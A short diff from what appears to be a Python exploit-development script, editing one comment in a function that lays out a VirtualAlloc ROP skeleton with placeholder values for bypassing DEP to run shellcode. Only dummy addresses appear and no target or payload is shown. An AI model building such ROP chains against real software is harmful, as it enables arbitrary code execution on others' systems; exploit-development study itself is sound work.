@@ -32,7 +32,7 @@ def rop_virtualalloc():
     va = p32(0x45454545)  # dummy VirtualAlloc Address (API ADDRESS)
     va += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
     va += p32(0x47474747)  # Shellcode Return Address (RETURN ADDRESS)
-    va += p32(0x48484848)  # dummy dwSize set to 0x00000001 for RWX
+    va += p32(0x48484848)  # dummy dwSize set to 0x00000001 for RWX (make it 0x201)
     va += p32(0x49494949)  # dummy flAllocationType set to 0x1000 (MEM_COMMIT)
     va += p32(0x51515151)  # dummy flProtect set to 0x40 (PAGE_EXECUTE_READWRITE)
     return va
